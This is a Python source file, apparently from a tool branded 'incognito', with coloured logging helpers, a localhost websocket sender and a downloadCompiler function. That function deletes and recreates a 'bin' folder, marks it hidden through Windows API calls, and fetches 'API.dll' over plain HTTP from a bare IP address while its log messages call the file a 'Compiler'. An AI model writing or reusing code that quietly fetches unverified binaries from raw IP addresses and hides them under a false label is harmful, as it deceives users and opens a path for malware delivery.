import colorama, websocket, time, os, ctypes, shutil, urllib.request
from colorama import Fore, Style
colorama.init(autoreset=True)

debugmode = True
threaddebugmode = False
debugmode2 = True

def debug(*args, **kwargs):
    if debugmode == True:
        print(Fore.YELLOW + "[incognito]", *args, **kwargs)

def bridge(*args, **kwargs):
    if debugmode == True:
        print("")
        print(Fore.LIGHTYELLOW_EX + "[incognito]", *args, **kwargs)

def info(*args, **kwargs):
    if debugmode == True:
        print(Fore.BLUE + "[incognito]", *args, **kwargs)

def error(*args, **kwargs):
    if debugmode == True:
        print(Fore.RED + "[incognito]", *args, **kwargs)

def offset(*args, **kwargs):
    if debugmode == True:
        print(Fore.GREEN + "[incognito]", *args, **kwargs)

def printthread(*args, **kwargs):
    if threaddebugmode == True:
        print(Fore.MAGENTA + "[incognito]", *args, **kwargs)

def printsinglethread(*args, **kwargs):
    if debugmode == True and threaddebugmode == False:
        print("")
        print(Fore.MAGENTA + "[incognito]", *args, **kwargs)
        print("")

def send_message(message):
    if debugmode2 == False:
        try:
            ws = websocket.create_connection("ws://localhost:8060/ws/")
            ws.send(message)
            ws.close()
        except Exception as e:
            error("IMPORTANT ERROR WHILE SENDING MESSAGE:", e)
            time.sleep(1)
            send_message(message)

def downloadCompiler():
    def set_hidden_attribute(file_path):
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)

    def download_file(url, file_name, target_dir):
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
            set_hidden_attribute(target_dir)
        else:
            shutil.rmtree(target_dir)
            os.makedirs(target_dir)
            set_hidden_attribute(target_dir)
        
        target_file_path = os.path.join(target_dir, file_name)
        urllib.request.urlretrieve(url, target_file_path)

    if debugmode2 == False:
        info("Downloading Compiler")
        download_file('http://185.219.84.198/API.dll', 'API.dll', 'bin')
        info("Finished downloading Compiler")
    else:
        info("Skipping Compiler Download")
